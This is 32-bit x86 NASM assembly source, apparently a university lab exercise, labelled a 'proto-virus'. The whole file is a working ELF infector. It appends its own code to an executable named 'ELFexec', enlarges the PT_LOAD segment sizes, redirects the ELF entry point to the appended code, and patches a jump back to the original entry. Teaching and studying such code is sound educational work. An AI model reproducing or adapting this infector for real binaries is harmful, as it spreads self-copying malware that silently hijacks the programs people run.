%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_CUR 1
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

; hi
%define STDOUT 1
%define STDERR 2

%define file_header_size	52

%define ph_offset	28
%define ph_entry_size	32 ; 40?
%define PT_LOAD		1


%define off_base_addr	4
%define off_fd		8
%define off_size	12
%define off_magnum	16
%define off_entry	20
%define off_new_entry	24
%define off_opcode_mov_eax	31
%define off_opcode_entry	30
%define off_opcode_jmp_eax	26
%define off_exit_code		35
%define off_ph_offset		39
%define off_ph_entry_size	41
%define off_ph_entry_count	43
%define off_start_vaddr		47
%define off_ph_type		51
%define off_file_size		55
%define off_mem_size		59
%define off_new_filesize	63
%define off_new_memsize		67
%define off_file_header		67+file_header_size ; = 119

%define magsize 4
%define magnum	0x464c457f ; = '.ELF' in little indian

%define opcode_mov_eax			0xb8
%define opcode_jmp_eax			0xe0ff ; flipped because of little indian...
%define opcode_size_mov_eax		1
%define opcode_size_jmp_eax		2

%define program_headers_start		52
%define program_headers_entry_size	32
%define file_header_size		52

%macro set_errorno 1
	mov [ebp-off_exit_code], dword %1
%endmacro

	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
	; take base address
	call base_address
	base_address:
	pop eax
	mov [ebp-off_base_addr], eax
	
	; reset exit code
	set_errorno dword 0
	
	; write virus threatening sentence
	mov eax, dword [ebp-off_base_addr]
	sub eax, dword base_address-OutStr
	write STDOUT, eax, OutStr_length
	
	mov eax, dword [ebp-off_base_addr]
	sub eax, dword base_address-FileName
	open eax, RDWR, 0
	cmp eax, dword 0
	jge .fileOK
	; error
	mov eax, dword [ebp-off_base_addr]
	sub eax, dword base_address-Failstr
	write STDERR, eax, Failstr_length
	set_errorno dword 1
	jmp VirusExit
	.fileOK:
	; backup fd
	mov [ebp-off_fd], dword eax
	
	; read magic number
	mov eax, ebp
	sub eax, off_magnum ; eax now equals to ebp-off_magnum, which is where the magic number is going to be read into
	read [ebp-off_fd], eax, magsize ; read magic number into [ebp-off_magnum]
	mov eax, dword [ebp-off_magnum]
	magnumm:
	; check magic number
	cmp [ebp-off_magnum], dword magnum
	je .isElfFile
	set_errorno dword 2
	jmp VirusExit
	.isElfFile:
	; move to the end of the file
	lseek [ebp-off_fd], 0, SEEK_END
	
	; backup size
	mov [ebp-off_size], eax
	
	; write virus to file
	mov eax, dword [ebp-off_base_addr]
	sub eax, dword base_address-_start
	write [ebp-off_fd], eax, virus_end-_start
	cmp eax, 0
	jg .write_ok
	set_errorno dword 3
	jmp VirusExit
	.write_ok:
	
	
	; read program headers offset
	lseek [ebp-off_fd], ph_offset, SEEK_SET
	mov eax, ebp
	sub eax, dword off_ph_offset
	read [ebp-off_fd], eax, 4
	
	; read program headers entry size and entry count
	lseek [ebp-off_fd], ph_entry_size, SEEK_SET
	mov eax, ebp
	sub eax, dword off_ph_entry_size
	read [ebp-off_fd], eax, 2
	
	
	mov ecx, dword [ebp-off_ph_offset]
	lseek [ebp-off_fd], ecx, SEEK_SET
	mov ecx, dword [ebp-off_ph_entry_size]
	mov eax, ebp
	sub eax, dword off_ph_type
	.header_seek_loop_start:
	; read program header
	read [ebp-off_fd], eax, 4
	; compare type tp PT_LOAD
	cmp [ebp-off_ph_type], dword PT_LOAD
	je .found_LOAD_header	; found the right header
	; loop step
	sub ecx, dword 4
	lseek [ebp-off_fd], ecx, SEEK_CUR
	jmp .header_seek_loop_start
	.found_LOAD_header:
	lseek [ebp-off_fd], PHDR_vaddr-4, SEEK_CUR
	mov eax, ebp
	sub eax, dword off_start_vaddr
	read [ebp-off_fd], eax, 4
	
	
	; calculate new filesize
	lseek [ebp-off_fd], PHDR_filesize-PHDR_vaddr-4, SEEK_CUR
	mov eax, ebp
	sub eax, dword off_file_size
	read [ebp-off_fd], eax, 4
	mov eax, dword [ebp-off_file_size]
	add eax, virus_end-_start
	mov [ebp-off_new_filesize], dword eax
	
	; calculate new memsize
	mov eax, ebp
	sub eax, dword off_mem_size
	read [ebp-off_fd], eax, 4
	mov eax, dword [ebp-off_mem_size]
	add eax, virus_end-_start
	mov [ebp-off_new_memsize], dword eax
	
	
	
	; change filesize, memsize in file header
	lseek [ebp-off_fd], PHDR_filesize-PHDR_memsize-4, SEEK_CUR ; set the file for writing to size in program header 
	
	mov eax, ebp
	sub eax, dword off_new_filesize
	write [ebp-off_fd], eax, 4 ; overwrite filesize
	
	mov eax, ebp
	sub eax, dword off_new_memsize
	write [ebp-off_fd], eax, 4 ; overwrite memsize
	
	
	entry:
	; set fd on the entry point location
	lseek [ebp-off_fd], ENTRY, SEEK_SET
	; read entry point to [ebp-off_entry]
	mov eax, ebp
	sub eax, off_entry ; eax = pointer to stack at off_entry (ebp-off_entry)
	read [ebp-off_fd], eax, 4
	
	; write entry point
	mov eax, dword [ebp-off_size]
	add eax, dword [ebp-off_start_vaddr]
	mov [ebp-off_new_entry], dword eax
	; set fd on the entry point location
	lseek [ebp-off_fd], ENTRY, SEEK_SET
	; write new entry point to file header
	mov eax, ebp
	sub eax, dword off_new_entry
	write [ebp-off_fd], eax, 4
	
	; write new instruction to 'jmp old_entry' istead of 'exit 0' in VirusExit in file
	; set opcode and jump location in opcodes places in stack
	mov [ebp-off_opcode_mov_eax], byte opcode_mov_eax
	mov [ebp-off_opcode_jmp_eax], dword opcode_jmp_eax
	mov eax, dword [ebp-off_entry]
	mov dword [ebp-off_opcode_entry], eax
	
	; find VirusExit at the end of the file
	mov eax, dword VirusExit-_start
	add eax, [ebp-off_size]
	lseek [ebp-off_fd], eax, SEEK_SET
	
	; point to opcodes in stuck with eax
	mov eax, ebp
	sub eax, dword off_opcode_mov_eax
	write [ebp-off_fd], eax, opcode_size_mov_eax+4+opcode_size_jmp_eax
	
	
	close [ebp-off_fd]
VirusExit:
	mov eax, dword [ebp-off_exit_code]
	exit eax            ; Termination if all is OK and no previous code to jump to
			  ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
FileName_length:equ $ - FileName
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStr_length:	equ $ - OutStr
Failstr:        db "perhaps not", 10 , 0
Failstr_length:	equ $ - Failstr

PreviousEntryPoint: dd VirusExit
virus_end:


